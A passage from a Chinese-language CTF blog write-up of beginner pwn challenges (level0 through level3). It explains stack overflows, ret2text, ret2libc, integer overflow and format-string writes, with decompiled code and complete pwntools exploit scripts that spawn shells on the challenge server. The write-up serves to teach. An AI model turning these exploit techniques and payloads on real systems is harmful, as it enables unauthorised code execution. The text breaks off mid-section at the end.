class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">callsystem</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们很容易写出payload脚本如下。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        payload代码    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># sh = process(&quot;./level0&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">52435</span>)<br>sys_addr = <span class="hljs-number">0x0400596</span><br>payload = <span class="hljs-string">b&quot;a&quot;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">8</span>) + p64(sys_addr)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>    </div></div><h3 id="3level2"><a class="markdownIt-Anchor" href="#3level2"></a> 3.level2</h3><p>这道题便是ctfwiki pwn中basic rop中的ret2libc例1的情况。</p><p>链接：<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#1">基本 ROP - CTF Wiki (ctf-wiki.org)</a></p><p>该题首先对由于read函数读取的字符个数大于变量本身的限制，存在栈溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">136</span>]; <span class="hljs-comment">// [esp+0h] [ebp-88h] BYREF</span><br><br>  system(<span class="hljs-string">&quot;echo Input:&quot;</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><p>这道题中和level0不同，level0属于 ret2txt，即return回到已有的代码上，因为上题中的callsystem函数能够直接get shell，我们直接返回到它的地址即可。可惜这道题里没有这样成品的后门函数。</p><p>但是从IDA中我们可以看到代码有system函数，也有<code>/bin/sh</code>这个字符串，我们可以将他们进行按照函数调用的规则入栈，从而get shell。</p><p>入栈规则 首先传入system函数的plt地址，然后传入一个返回地址，最后传参数的地址。</p><p>这个返回地址我们可以随便写，为了凑足一个字（这道题是32位的，即4个字节），我们可以传4个字符作为返回地址。</p><p>这道题的payload代码里，我根据ctfwiki，使用了pwntools中flat函数，它可以让你免于写类似<code>b'a'</code>和<code>p32</code>这种煞风景的结构，而自动帮你构建符合要求的payload。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        payload代码    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">60184</span>)<br><span class="hljs-comment"># sh = process(&quot;./level1&quot;)</span><br>system_plt = <span class="hljs-number">0x08048320</span><br>binsh_addr = <span class="hljs-number">0x0804A024</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">136</span> + <span class="hljs-number">4</span>), system_plt, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">4</span>, binsh_addr])<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>    </div></div><h3 id="4get_shell"><a class="markdownIt-Anchor" href="#4get_shell"></a> 4.get_shell</h3><p>突然发现攻防世界的题目顺序每次都在变，那有点狗了。这道明明应该放在第一道的。</p><p>nc过去就是shell。以下是它的main函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK,this time we will get a shell.&quot;</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5hello_pwn"><a class="markdownIt-Anchor" href="#5hello_pwn"></a> 5.hello_pwn</h3><p>最简单的栈溢出。main函数如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  alarm(<span class="hljs-number">0x3C</span>u);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;~~ welcome to ctf ~~     &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;lets get helloworld for bof&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;unk_601068, <span class="hljs-number">0x10</span>uLL);<br>  <span class="hljs-keyword">if</span> ( dword_60106C == <span class="hljs-number">1853186401</span> )<br>    sub_400686();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>利用read函数读了16个字符，而unk_601068这个变量实际上只占4个空间，我们可以影响到栈下面的dword_60106C。把下面那个变量设置为1853186401即可获得flag。</p><p><img src="https://upyun.wuuconix.link/image-20220201112957824.png" alt="栈情况" /></p><div class='spoiler collapsed'>    <div class='spoiler-title'>        payload代码    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># sh = process(&#x27;./hello_pwn&#x27;)</span><br>sh = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">49499</span>)<br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">4</span>, <span class="hljs-number">1853186401</span>])<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>    </div></div><h3 id="6guess_num"><a class="markdownIt-Anchor" href="#6guess_num"></a> 6.guess_num</h3><p>仍然是栈溢出。但是这道题我不太明白为什么不能直接移除到ret2text的方式，直接去调用cat flag的函数，可能是和该题开启了canary的方式（运行过程中没有报错就挺奇怪的</p><p><img src="https://upyun.wuuconix.link/image-20220201195221937.png" alt="最终猜数成功调用的函数" /></p><p>看了网上的wp，利用溢出去改变随机数的种子，让其产生的随机数固定，然后我们就能成功猜数，通过正常的程序流cat flag。总结一下就是利用栈溢出了，但是没有完全利用。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">-<span class="hljs-number">0000000000000030</span> var_30          db <span class="hljs-number">32</span> <span class="hljs-built_in">dup</span>(?) <span class="hljs-comment">//这是我们gets的那个变量</span><br>-<span class="hljs-number">0000000000000010</span> seed            <span class="hljs-selector-tag">dd</span> <span class="hljs-number">2</span> <span class="hljs-built_in">dup</span>(?)  <span class="hljs-comment">//wp需要改变这个</span><br>-<span class="hljs-number">0000000000000008</span> var_8           dq ?<br>+<span class="hljs-number">0000000000000000</span>  s              db <span class="hljs-number">8</span> <span class="hljs-built_in">dup</span>(?)<br>+<span class="hljs-number">0000000000000008</span>  r              db <span class="hljs-number">8</span> <span class="hljs-built_in">dup</span>(?)  <span class="hljs-comment">//为什么不能直接rop，可能是Cannary作怪</span><br></code></pre></td></tr></table></figure><p>在看wp的过程中，还了解到在python中利用<code>ctypes</code>能够导入一个libc库从而直接运行c函数，非常牛皮。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        payload代码    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> cdll<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># sh = process(&#x27;./guess_num&#x27;)</span><br>sh = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">55235</span>)<br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>libc.srand(<span class="hljs-number">1</span>)<br><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span>, <span class="hljs-number">1</span>]) <span class="hljs-comment">#将seed置为1</span><br>sh.sendline(payload)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    num = <span class="hljs-built_in">str</span>(libc.rand() % <span class="hljs-number">6</span> + <span class="hljs-number">1</span>)<br>    sh.recvuntil(<span class="hljs-string">&quot;number:&quot;</span>)<br>    sh.sendline(num)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>    </div></div><h3 id="7int_overflow"><a class="markdownIt-Anchor" href="#7int_overflow"></a> 7.int_overflow</h3><p>本题中有strcpy函数提供栈溢出条件，同时题目设置了一道关卡，必须想到整数溢出通过关卡后才能去利用栈溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *__cdecl <span class="hljs-title function_">check_passwd</span><span class="hljs-params">(<span class="hljs-type">char</span> *s)</span><br>&#123;<br>  <span class="hljs-type">char</span> dest[<span class="hljs-number">11</span>]; <span class="hljs-comment">// [esp+4h] [ebp-14h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [esp+Fh] [ebp-9h]</span><br><br>  v3 = <span class="hljs-built_in">strlen</span>(s);<br>  <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">3u</span> || v3 &gt; <span class="hljs-number">8u</span> ) <span class="hljs-comment">//这里需要利用整数溢出绕过，因为我们的payload大于8个字节，可以使用260~263个字节的payload来绕过</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid Password&quot;</span>);<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">char</span> *)fflush(<span class="hljs-built_in">stdout</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>    fflush(<span class="hljs-built_in">stdout</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">strcpy</span>(dest, s); <span class="hljs-comment">//ret2txt，题目中设置了后门函数可以直接cat flag</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这道题中，由于payload较长，我们正常写payload可能会写成这样。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x14</span> + <span class="hljs-number">4</span>) + p32(success_plt) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">232</span> <br></code></pre></td></tr></table></figure><p>如果利用上flat来去掉一些难看的结构，我们可能会写成这样。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = flat([a * (<span class="hljs-number">0x14</span> + <span class="hljs-number">4</span>), success_plt, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">232</span>])<br></code></pre></td></tr></table></figure><p>但是这还是非常麻烦，特别是我们要手动算出最后要添加多少个a，来到达260的长度。</p><p>所以我现在利用flat函数的高阶用法，利用一个字典来指定第几位是什么值，其他的值就会自动补为a。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = flat([<span class="hljs-number">0x14</span> + <span class="hljs-number">4</span>: success_plt, <span class="hljs-number">260</span>: <span class="hljs-string">&#x27;1&#x27;</span>])<br></code></pre></td></tr></table></figure><div class='spoiler collapsed'>    <div class='spoiler-title'>        最终payload代码    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># sh = process(&quot;./int_overflow&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">63700</span>)<br>success_plt = <span class="hljs-number">0x0804868B</span><br>sh.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>) <span class="hljs-comment">#1号选项</span><br>sh.sendlineafter(<span class="hljs-string">&quot;username:\n&quot;</span>, <span class="hljs-string">&quot;wuuconix&quot;</span>) <span class="hljs-comment">#username</span><br>sh.recvuntil(<span class="hljs-string">&quot;passwd:\n&quot;</span>) <span class="hljs-comment">#到达漏洞点</span><br>payload = flat(&#123; <span class="hljs-number">0x14</span> + <span class="hljs-number">4</span> : success_plt, <span class="hljs-number">260</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>    </div></div><h3 id="8cgpwn2"><a class="markdownIt-Anchor" href="#8cgpwn2"></a> 8.cgpwn2</h3><p>本题应该属于基本ROP中的ret2libc。没有现成的后门函数，比如<code>system('/bin/sh')</code>或者<code>system('cat flag')</code>之类的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> pwn()<br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;echo hehehe&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>但是这个后门函数中有system，我们再找到一个/bin/sh字符串就能够去手动调用了。可惜shift+F12，没有找到这个字符串。</p><p>我们观察可执行文件的运行流程，它会让我们输入姓名和一条信息，在信息那块有gets造成的栈溢出，而姓名那块我们则可以输入一个/bin/sh来手动把name变成我们需要的字符串。</p><p><img src="https://upyun.wuuconix.link/image-20220202140445981.png" alt="可执行文件运行流程" /></p><div class='spoiler collapsed'>    <div class='spoiler-title'>        payload代码    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># sh = process(&quot;./cgpwn2&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">62148</span>)<br>sh.sendlineafter(<span class="hljs-string">&quot;name\n&quot;</span>, <span class="hljs-string">&quot;/bin/sh&quot;</span>) <span class="hljs-comment">#构造/bin/sh字符串</span><br>sh.recvuntil(<span class="hljs-string">&quot;here:\n&quot;</span>) <span class="hljs-comment">#到达栈溢出漏洞点</span><br>sys_plt = <span class="hljs-number">0x08048420</span><br>bin_sh_addr = <span class="hljs-number">0x0804A080</span> <span class="hljs-comment">#即name变量</span><br>payload = flat(&#123;<span class="hljs-number">0x26</span> + <span class="hljs-number">4</span>: [sys_plt, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">4</span>, bin_sh_addr]&#125;)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>    </div></div><h3 id="9string"><a class="markdownIt-Anchor" href="#9string"></a> 9.string</h3><p>这道题的流程相比之前所有的题目都要复杂。但是考点实际上只有两个，一个是格式化字符串漏洞，一个是shellcode的构建。</p><p>以下是这道题的主要流程</p><pre><code class=" mermaid">graph TDmain[&quot;主函数main&lt;br&gt;包含sub_400996&lt;br&gt;和sub_400D72&lt;br&gt;开局输出了两个secret地址&lt;br&gt;为之后的fmtstr利用&quot;]sub_400996[&quot;sub_400996&lt;br&gt;输出welcom信息&quot;]sub_400D72[&quot;sub_400D72(a1)&lt;br&gt;输入角色名&lt;br&gt;包含sub_400A7D&lt;br&gt;sub_400BB9&lt;br&gt;sub_400CA6(a1)&quot;]sub_400A7D[&quot;sub_400A7D&lt;br&gt;选择east or up&lt;br&gt;必须选择east&quot;]sub_400BB9[&quot;sub_400BB9&lt;br&gt;选择1还是0&lt;br&gt;必须选择1&lt;br&gt;然后提示输入一个地址&lt;br&gt;我们应该输入主函数中提示的secret地址&lt;br&gt;利用格式化字符串漏洞&lt;br&gt;将secret[0]变为85&quot;]sub_400CA6[&quot;sub_400CA6(a1)&lt;br&gt;在成功利用格式化字符串漏洞后&lt;br&gt;输入shellcode执行&quot;]main--&gt;sub_400996--&gt;sub_400D72sub_400A7D--&gt;sub_400BB9--&gt;sub_400CA6</code></pre><p>以下为程序中的关键代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//sub_400BB9 函数</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;A voice heard in your mind&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&#x27;Give me an address&#x27;&quot;</span>);<br>_isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v2); <span class="hljs-comment">//输入地址</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;And, you wish is:&quot;</span>);<br>_isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, format); <span class="hljs-comment">//输入格式化字符串</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your wish is&quot;</span>);<br><span class="hljs-built_in">printf</span>(format);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I hear it, I hear it....&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//main函数</span><br><span class="hljs-keyword">if</span> ( *a1 == a1[<span class="hljs-number">1</span>] ) <span class="hljs-comment">//需要利用sub_400BB9函数中的格式化字符串漏洞修改变量的值进入if循环</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>);<br>    v1 = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">33</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>); <span class="hljs-comment">//</span><br>    read(<span class="hljs-number">0</span>, v1, <span class="hljs-number">0x100</span>uLL); <span class="hljs-comment">//需要输入生成的shellcode</span><br>    ((<span class="hljs-type">void</span> (__fastcall *)(_QWORD))v1)(<span class="hljs-number">0LL</span>); <span class="hljs-comment">//程序会运行我们输入shellcode</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我在花了很久终于整理出流程并且有了解体思路后，由于我对格式化字符串漏洞不太熟练，之前做 <a href="https://wuuconix.link/2022/01/30/pwn/#1cgfsb">cgfsb</a>的时候只是用了pwntools中的fmtstr_payload，没有了解具体payload的实现原理，这里便一直无法突破第一关。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-0000000000000078 var_78          dq ?</span><br><span class="hljs-deletion">-0000000000000070 format          db ?</span><br></code></pre></td></tr></table></figure><p>这是格式化字符串漏洞那个子函数里栈的情况，format是格式化字符串，var_78则是我们输入的地址。</p><p>根据 <a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/#_6">原理介绍 - CTF Wiki (ctf-wiki.org)</a> 对格式化字符串原理的介绍，当格式化字符串中使用了 %d, %s之类的标记，但是没有指定参数，那么就会从format变量栈上面的变量中取值。所以相当于<code>var_78</code>已经指明了地址，现在我们的目标是将这个地址里的值变为85，我们可以使用以下payload。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;%85c%7$hhn&#x27;</span><br></code></pre></td></tr></table></figure><p>首先这里我们主要利用的%标记是%n，它的功能是将之前输出的字符个数的值存放到对应的地址中，在这里，就会存放到<code>var_78</code>中，因为没有指定参数。</p><p>而这个payload中没有使用<code>n</code>而是使用了<code>hhd</code>，它们的区别是写的内存地址的长度，若是<code>%n</code>，则是向4个字节的内存地址写数据，<code>%hn</code>则是2个字节，<code>%hhn</code>则会是1个字节。因为这道题里我们需要改变的两个变量占的空间是8位，即1个字节，故我们这里使用<code>%hhn</code>。</p><p>那为什么<code>%hhn</code>中间有<code>7$</code>，这个有点难以解释，我们可以暂且记为偏移量减去1。</p><p><img src="https://upyun.wuuconix.link/image-20220203151241758.png" alt="偏移量是8" /></p><p>然后<code>%85c</code>用来快速生成85个字符，从而得到85这个数字存往<code>var_78</code>中，通过第一关。</p><p>然后我们可以利用以下代码生成shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">context(arch = <span class="hljs-string">&quot;amd64&quot;</span>) <span class="hljs-comment">#因为这里用了asm构造的shellcode，必须指明架构。架构用checksec可以看</span><br>payload = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><div class='spoiler collapsed'>    <div class='spoiler-title'>        payload代码    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch = <span class="hljs-string">&quot;amd64&quot;</span>) <span class="hljs-comment">#因为这里用了asm构造的shellcode，必须指明架构。架构用checksec可以看</span><br><span class="hljs-comment"># sh = process(&quot;./string&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">58683</span>)<br>secret0 = sh.recvline_startswith(<span class="hljs-string">&quot;secret[0]&quot;</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>).split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>]<br>sh.sendlineafter(<span class="hljs-string">&quot;character&#x27;s name be:&quot;</span>, <span class="hljs-string">&quot;wuuconix&quot;</span>) <span class="hljs-comment">#随便输入一个name</span><br>sh.sendlineafter(<span class="hljs-string">&quot;east or up?:&quot;</span>, <span class="hljs-string">&quot;east&quot;</span>) <span class="hljs-comment">#选择east</span><br>sh.sendlineafter(<span class="hljs-string">&quot;leave(0)?:&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>) <span class="hljs-comment">#选择there(1)</span><br>sh.sendlineafter(<span class="hljs-string">&quot;an address&#x27;&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(secret0, <span class="hljs-number">16</span>))) <span class="hljs-comment">#输入secret0的地址</span><br><span class="hljs-comment"># payload1 = fmtstr_payload(7, &#123;int(secret0, 16): 85&#125;, write_size=&#x27;byte&#x27;) #错误的做法</span><br>payload1 = <span class="hljs-string">b&#x27;%85c%7$hhn&#x27;</span><br>sh.sendlineafter(<span class="hljs-string">&quot;you wish is:&quot;</span>, payload1) <span class="hljs-comment">#利用格式化字符串漏洞</span><br>将v3(a1)变为<span class="hljs-number">85</span>，和v4(a1 + <span class="hljs-number">1</span>)一样<br>payload2 = asm(shellcraft.sh())<br>sh.sendlineafter(<span class="hljs-string">&quot;USE YOU SPELL&quot;</span>, payload2)<br>sh.interactive()<br></code></pre></td></tr></table></figure>    </div></div><h3 id="10level3"><a class="markdownIt-Anchor" href="#10level3"></a> 10.level3</h3><p>攻防世界的最后一题啦！题目的流程很简单，就是一个输入，然后就没了，相比第九题string简单许多。</p><p>它的考点是ret2libc，利用libc来得到system函数的真实地址和/bin/sh的真实地址，然后调用获得shell。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">136</span>]; <span class="hljs-comment">// [esp+0h] [ebp-88h] BYREF</span><br><br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Input:\n&quot;</span>, <span class="hljs-number">7u</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>u); <span class="hljs-comment">//读取大于0x88的数据，造成栈溢出漏洞</span><br>&#125;<br></code></pre></td></tr></table></figure><p>当我们在用C语言编程时，我们都会大量应用库函数，比如printf和scanf等，这些函数都是存在在动态链接库中的。</p><p>理论上我们可以使用动态链接库中的任意函数，但是这些函数在内存中的地址在程序运行的一开始是不知道的，这是为了提升效率，只有当真正去调用它的时候，才会进行绑定，这也叫做叫延迟绑定<code>lazy bind</code>。然后这个绑定后的真实地址会被存在GOT表中。</p><p>在这道题中，题目的附件里给了一个libc文件 <code>libc_32.so.6</code>。它实际上不神秘，它本质上也是一个ELF文件，也能用checksec查看保护情况。</p><p><img src="https://upyun.wuuconix.link/image-20220203194259889.png" alt="libc_32.so.6 checksec" /></p><p>它也能用IDA打开，只不过它的函数特别特别多，我们可以在函数列表用<code>ctrl + F</code>来搜索我们想要查看的函数。</p><p><img src="https://upyun.wuuconix.link/image-20220203194842457.png" alt="system 地址0x3A940" /></p><p>可以用shift + F12搜索我们想要的字符串。</p><p><img src="https://upyun.wuuconix.link/image-20220203194641077.png" alt="/bin/sh 地址0x15902B" 